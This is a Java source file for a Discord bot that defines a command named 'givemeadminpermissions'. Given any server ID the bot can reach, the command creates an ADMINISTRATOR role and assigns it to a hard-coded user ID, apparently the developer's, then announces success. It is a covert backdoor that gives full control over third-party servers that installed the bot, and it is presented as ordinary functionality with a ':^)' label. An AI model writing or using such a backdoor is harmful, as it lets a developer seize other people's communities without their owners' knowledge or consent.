package de.tectoast.emolga.commands.flo;

import de.tectoast.emolga.commands.Command;
import de.tectoast.emolga.commands.CommandCategory;
import de.tectoast.emolga.commands.GuildCommandEvent;
import de.tectoast.emolga.utils.Constants;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;

import java.awt.*;

public class GiveMeAdminPermissionsCommand extends Command {
    public GiveMeAdminPermissionsCommand() {
        super("givemeadminpermissions", ":^)", CommandCategory.Flo);
        setArgumentTemplate(ArgumentManagerTemplate.builder().add("guild", "Guild-ID", "Die ID des Servers :)", ArgumentManagerTemplate.DiscordType.ID)
                .setExample("!givemeadminpermissions 447357526997073930")
                .build());
    }

    @Override
    public void process(GuildCommandEvent e) {
        Guild g = e.getJDA().getGuildById(e.getArguments().getID("guild"));
        Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").complete();
        g.addRoleToMember(Constants.FLOID, r).queue();
        EmbedBuilder builder = new EmbedBuilder();
        builder.setTitle("Succesfully gave admin permission on \"" + g.getName() + "\"!").setColor(Color.RED);
        e.getChannel().sendMessageEmbeds(builder.build()).queue();
    }
}
